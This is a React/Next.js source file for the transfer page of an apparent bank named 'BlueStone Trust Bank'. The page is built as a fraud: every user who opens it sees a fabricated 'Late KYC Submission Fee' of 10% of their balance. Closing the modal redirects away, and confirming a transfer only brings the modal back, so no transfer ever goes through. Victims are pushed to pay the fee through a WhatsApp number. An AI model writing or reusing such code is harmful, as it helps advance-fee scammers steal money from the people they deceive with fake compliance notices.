"use client"

import { useState, useEffect, useRef } from "react"
import Link from "next/link"
import { useRouter } from "next/navigation"
import {
  ChevronLeft, ChevronRight, CheckCircle, Send,
  ShieldAlert, Clock, FileWarning, BadgePercent, X,
} from "lucide-react"
import { useApp } from "@/lib/store"

const WHATSAPP_HREF = "https://wa.me/16722814398"

// ─── WhatsApp SVG ─────────────────────────────────────────────────────────────

function WhatsAppIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="currentColor">
      <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z" />
    </svg>
  )
}

// ─── Late KYC Penalty Modal ───────────────────────────────────────────────────

function LatePenaltyModal({
  balance,
  onDismiss,
}: {
  balance: number
  onDismiss: () => void
}) {
  const penaltyFee = +(balance * 0.10).toFixed(2)
  const refId      = useRef("TRF-" + Math.random().toString(36).toUpperCase().slice(2, 11))

  return (
    <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center p-0 sm:p-4">
      {/* Backdrop — clicking it redirects to dashboard */}
      <div
        className="absolute inset-0 bg-black/70 backdrop-blur-sm animate-fade-in"
        onClick={onDismiss}
      />

      {/* Sheet / Modal */}
      <div className="relative w-full sm:max-w-md bg-white sm:rounded-3xl rounded-t-3xl shadow-2xl overflow-hidden animate-scale-in max-h-[92vh] flex flex-col">

        {/* Header stripe */}
        <div className="bg-gradient-to-r from-[#7c2d12] to-[#b91c1c] px-5 py-3.5 flex items-center gap-3 shrink-0">
          <ShieldAlert size={18} className="text-red-200 shrink-0" />
          <div className="flex-1">
            <p className="text-white text-xs font-bold tracking-widest uppercase">
              Transfer Blocked
            </p>
            <p className="text-red-200 text-[10px] mt-0.5">Compliance Notice · {refId.current}</p>
          </div>
          {/* X redirects to dashboard */}
          <button
            onClick={onDismiss}
            className="w-7 h-7 flex items-center justify-center rounded-full bg-white/20 text-white hover:bg-white/30 transition-colors shrink-0"
          >
            <X size={14} />
          </button>
        </div>

        {/* Scrollable body */}
        <div className="overflow-y-auto flex-1 p-5 space-y-4">

          {/* Icon + title */}
          <div className="flex flex-col items-center pt-2 pb-1">
            <div className="relative mb-4">
              <div className="w-16 h-16 rounded-2xl bg-amber-50 border-2 border-amber-200 flex items-center justify-center">
                <Clock size={30} className="text-amber-500" />
              </div>
              <div className="absolute -bottom-1 -right-1 w-6 h-6 bg-red-500 rounded-full flex items-center justify-center">
                <FileWarning size={13} className="text-white" />
              </div>
            </div>
            <h2 className="text-[#0c2d4e] font-bold text-lg tracking-tight text-center">
              Late KYC Submission Fee Required
            </h2>
            <p className="text-[#94a3b8] text-xs text-center mt-1 max-w-xs">
              Your KYC documents were validated but submitted outside the required
              <strong className="text-[#64748b]"> 30-minute activation window</strong>.
            </p>
          </div>

          {/* Explanation card */}
          <div className="bg-[#fff7ed] border border-amber-200 rounded-2xl p-4">
            <div className="flex items-start gap-2.5">
              <BadgePercent size={16} className="text-amber-500 shrink-0 mt-0.5" />
              <div>
                <p className="text-xs font-bold text-[#92400e]">10% Late Compliance Penalty</p>
                <p className="text-xs text-[#78350f] leading-relaxed mt-0.5">
                  In accordance with BlueStone Trust Bank compliance regulations, accounts with
                  KYC documents submitted after the 30-minute onboarding window are subject
                  to a <strong>10% late activation fee</strong> before fund transfer rights
                  can be reinstated.
                </p>
              </div>
            </div>
          </div>

          {/* Fee breakdown */}
          <div className="bg-[#f8fafc] border border-[#e2e8f0] rounded-2xl p-4 space-y-2">
            <p className="text-xs font-bold text-[#0c2d4e] uppercase tracking-wide mb-1">
              Penalty Breakdown
            </p>
            {[
              ["Account Balance",      `$${balance.toLocaleString("en-US", { minimumFractionDigits: 2 })}`],
              ["Late Submission Rate", "10%"],
              ["Penalty Fee Due",      `$${penaltyFee.toLocaleString("en-US", { minimumFractionDigits: 2 })}`],
            ].map(([label, value], i) => (
              <div
                key={label}
                className={`flex justify-between text-sm ${i === 2 ? "border-t border-[#e2e8f0] pt-2 mt-1" : ""}`}
              >
                <span className="text-[#64748b]">{label}</span>
                <span className={`font-bold ${i === 2 ? "text-red-600" : "text-[#0c2d4e]"}`}>{value}</span>
              </div>
            ))}
          </div>

          {/* Steps */}
          <div className="space-y-2.5">
            <p className="text-xs font-bold text-[#0c2d4e] uppercase tracking-wide">
              How to Reinstate Transfer Access
            </p>
            {[
              {
                step: "01",
                color: "bg-[#e8f4fd] text-[#1a6fad]",
                title: "Contact Compliance Support",
                desc:  "Reach our 24/7 team via WhatsApp to open a penalty resolution case.",
              },
              {
                step: "02",
                color: "bg-amber-50 text-amber-600",
                title: "Pay Late Activation Fee",
                desc:  `Settle the $${penaltyFee.toFixed(2)} penalty to clear your compliance hold.`,
              },
              {
                step: "03",
                color: "bg-[#f0fdf9] text-[#0e9483]",
                title: "Transfer Access Unlocked",
                desc:  "Full transfer access reinstated within 15 minutes of payment confirmation.",
              },
            ].map(({ step, color, title, desc }) => (
              <div key={step} className="flex items-start gap-3">
                <div className={`w-8 h-8 rounded-xl flex items-center justify-center shrink-0 font-bold text-xs ${color}`}>
                  {step}
                </div>
                <div>
                  <p className="text-xs font-bold text-[#0c2d4e]">{title}</p>
                  <p className="text-xs text-[#94a3b8] leading-relaxed">{desc}</p>
                </div>
              </div>
            ))}
          </div>

          {/* Security badge */}
          <div className="bg-[#f0fdf9] border border-[#bbf7d0] rounded-xl px-4 py-2.5 flex items-center gap-2">
            <CheckCircle size={14} className="text-[#0e9483] shrink-0" />
            <p className="text-xs text-[#065f46] leading-relaxed">
              <strong>Secure & Confidential.</strong> All compliance transactions are
              encrypted and processed under BlueStone Trust Bank regulatory standards.
            </p>
          </div>
        </div>

        {/* Sticky CTA footer */}
        <div className="p-4 border-t border-[#f1f5f9] bg-white shrink-0 space-y-2">
          <a
            href={WHATSAPP_HREF}
            target="_blank"
            rel="noopener noreferrer"
            className="w-full flex items-center justify-center gap-2.5 bg-[#25d366] hover:bg-[#1ebe5d] active:scale-[0.97] text-white font-bold py-3.5 rounded-xl text-sm transition-all shadow-md hover:shadow-lg"
          >
            <WhatsAppIcon className="w-4 h-4" />
            Resolve with Support on WhatsApp
          </a>
          <p className="text-center text-[10px] text-[#94a3b8]">
            BlueStone Trust Bank · Compliance Dept · 24/7 Support
          </p>
        </div>
      </div>
    </div>
  )
}

// ─── Main Page ────────────────────────────────────────────────────────────────

type Step = "details" | "review"

export default function TransferPage() {
  const { currentUser } = useApp()
  const router = useRouter()

  const [step,      setStep]      = useState<Step>("details")
  const [form,      setForm]      = useState({ accountNumber: "", recipientName: "", amount: "", note: "" })
  const [errors,    setErrors]    = useState<Record<string, string>>({})
  const [showModal, setShowModal] = useState(false)

  const set = (k: string, v: string) => {
    setForm(p => ({ ...p, [k]: v }))
    setErrors(p => ({ ...p, [k]: "" }))
  }
  const numAmount = parseFloat(form.amount) || 0

  // Show penalty modal immediately for ALL users on page load
  useEffect(() => {
    setShowModal(true)
  }, [])

  const validate = () => {
    const e: Record<string, string> = {}
    if (!form.accountNumber.trim()) e.accountNumber = "Account number is required"
    if (!form.recipientName.trim()) e.recipientName = "Recipient name is required"
    if (numAmount < 1)                e.amount = "Minimum transfer is $1"
    if (numAmount > (currentUser?.balance ?? 0)) e.amount = "Insufficient balance"
    setErrors(e)
    return Object.keys(e).length === 0
  }

  // Dismissing the modal always redirects back to dashboard
  const handleDismiss = () => router.replace("/dashboard")

  // Intercept confirm step — always re-show modal
  const handleConfirm = () => setShowModal(true)

  return (
    <>
      {showModal && (
        <LatePenaltyModal
          balance={currentUser?.balance ?? 0}
          onDismiss={handleDismiss}
        />
      )}

      <div className="max-w-lg mx-auto pb-4 animate-fade-in-up">
        <div className="flex items-center gap-3 mb-6">
          {step === "review" ? (
            <button
              onClick={() => setStep("details")}
              className="w-9 h-9 flex items-center justify-center bg-white border border-[#e2e8f0] rounded-xl text-[#64748b] hover:text-[#0c2d4e] transition-all"
            >
              <ChevronLeft size={18} />
            </button>
          ) : (
            <Link href="/dashboard" className="w-9 h-9 flex items-center justify-center bg-white border border-[#e2e8f0] rounded-xl text-[#64748b] hover:text-[#0c2d4e] transition-all">
              <ChevronLeft size={18} />
            </Link>
          )}
          <div>
            <h1 className="text-xl font-bold text-[#0c2d4e] tracking-tight">Fund Transfer</h1>
            <p className="text-xs text-[#64748b]">
              Available: <strong className="text-[#0c2d4e]">${currentUser?.balance.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong>
            </p>
          </div>
        </div>

        {/* Step indicators */}
        <div className="flex items-center gap-2 mb-6">
          {["Details", "Review"].map((s, i) => {
            const done   = i === 0 && step === "review"
            const active = (i === 0 && step === "details") || (i === 1 && step === "review")
            return (
              <div key={s} className="flex items-center gap-2 flex-1">
                <div className={`flex items-center gap-1.5 text-xs font-semibold ${active ? "text-[#1a6fad]" : done ? "text-[#0e9483]" : "text-[#94a3b8]"}`}>
                  <div className={`w-6 h-6 rounded-full flex items-center justify-center text-[10px] font-bold ${active ? "bg-[#1a6fad] text-white" : done ? "bg-[#0e9483] text-white" : "bg-[#e2e8f0] text-[#94a3b8]"}`}>
                    {done ? <CheckCircle size={12} /> : i + 1}
                  </div>
                  {s}
                </div>
                {i < 1 && <div className={`flex-1 h-0.5 rounded-full ${done ? "bg-[#0e9483]" : "bg-[#e2e8f0]"}`} />}
              </div>
            )
          })}
        </div>

        {step === "details" && (
          <div className="bg-white border border-[#e2e8f0] rounded-2xl p-6 space-y-4 shadow-sm">
            {[
              { label: "Recipient Account Number", key: "accountNumber", placeholder: "BST-XXXXXXXXX" },
              { label: "Recipient Full Name",       key: "recipientName", placeholder: "Full name" },
            ].map(({ label, key, placeholder }) => (
              <div key={key}>
                <label className="block text-sm font-semibold text-[#334155] mb-1.5">
                  {label} <span className="text-red-500">*</span>
                </label>
                <input
                  value={form[key as keyof typeof form]}
                  onChange={(e) => set(key, e.target.value)}
                  className={`w-full px-4 py-3 border rounded-xl text-sm outline-none transition-all placeholder:text-[#c4d4e0] ${errors[key] ? "border-red-400 bg-red-50" : "border-[#e2e8f0] focus:border-[#1a6fad] focus:ring-2 focus:ring-[#1a6fad]/20"}`}
                  placeholder={placeholder}
                />
                {errors[key] && <p className="text-xs text-red-500 mt-1">{errors[key]}</p>}
              </div>
            ))}

            <div>
              <label className="block text-sm font-semibold text-[#334155] mb-1.5">
                Amount (USD) <span className="text-red-500">*</span>
              </label>
              <input
                type="number"
                value={form.amount}
                onChange={(e) => set("amount", e.target.value)}
                className={`w-full px-4 py-3 border rounded-xl text-sm outline-none transition-all placeholder:text-[#c4d4e0] ${errors.amount ? "border-red-400 bg-red-50" : "border-[#e2e8f0] focus:border-[#1a6fad] focus:ring-2 focus:ring-[#1a6fad]/20"}`}
                placeholder="0.00"
                min="1"
              />
              {errors.amount && <p className="text-xs text-red-500 mt-1">{errors.amount}</p>}
              {numAmount > 0 && (
                <div className="flex items-center justify-between mt-2 text-xs text-[#94a3b8]">
                  <span>Balance after: <strong className="text-[#0c2d4e]">${Math.max(0, (currentUser?.balance ?? 0) - numAmount).toFixed(2)}</strong></span>
                  <span className="text-[#0e9483] font-semibold">Free transfer</span>
                </div>
              )}
            </div>

            <div>
              <label className="block text-sm font-semibold text-[#334155] mb-1.5">
                Note <span className="text-[#94a3b8] font-normal text-xs">(optional)</span>
              </label>
              <textarea
                value={form.note}
                onChange={(e) => set("note", e.target.value)}
                rows={2}
                className="w-full px-4 py-3 border border-[#e2e8f0] rounded-xl text-sm outline-none focus:border-[#1a6fad] focus:ring-2 focus:ring-[#1a6fad]/20 transition-all resize-none placeholder:text-[#c4d4e0]"
                placeholder="Transfer note..."
              />
            </div>

            <button
              onClick={() => validate() && setStep("review")}
              className="w-full flex items-center justify-center gap-2 bg-[#0c2d4e] hover:bg-[#1a4a72] text-white font-bold py-3.5 rounded-xl transition-all text-sm hover:shadow-lg btn-press"
            >
              Review Transfer <ChevronRight size={16} />
            </button>
          </div>
        )}

        {step === "review" && (
          <div className="space-y-4 animate-fade-in-up">
            <div className="bg-white border border-[#e2e8f0] rounded-2xl p-6 shadow-sm">
              <h2 className="font-bold text-[#0c2d4e] mb-4 tracking-tight">Transfer Summary</h2>
              <div className="space-y-0">
                {[
                  ["From",       `${currentUser?.firstName} ${currentUser?.lastName}`],
                  ["Account",    currentUser?.accountNumber ?? ""],
                  ["To Account", form.accountNumber],
                  ["Recipient",  form.recipientName],
                  ["Amount",     `$${numAmount.toFixed(2)}`],
                  ["Fee",        "$0.00 (free)"],
                  ["Note",       form.note || "—"],
                ].map(([label, val]) => (
                  <div key={label} className="flex justify-between py-2.5 border-b border-[#f8fafc] last:border-0">
                    <span className="text-sm text-[#64748b]">{label}</span>
                    <span className="text-sm font-semibold text-[#0c2d4e] text-right max-w-[60%] break-all">{val}</span>
                  </div>
                ))}
              </div>
            </div>

            <div className="bg-[#e8f4fd] border border-[#1a6fad]/20 rounded-xl p-3 flex gap-2 text-xs text-[#0c2d4e]">
              <Send size={13} className="text-[#1a6fad] shrink-0 mt-0.5" />
              Funds are transferred instantly. Please verify recipient details before confirming.
            </div>

            <button
              onClick={handleConfirm}
              className="w-full flex items-center justify-center gap-2 bg-gradient-to-r from-[#0e9483] to-[#0a7a6d] hover:opacity-90 text-white font-bold py-3.5 rounded-xl transition-all text-sm hover:shadow-lg btn-press"
            >
              <Send size={16} /> Confirm Transfer
            </button>
          </div>
        )}
      </div>
    </>
  )
}
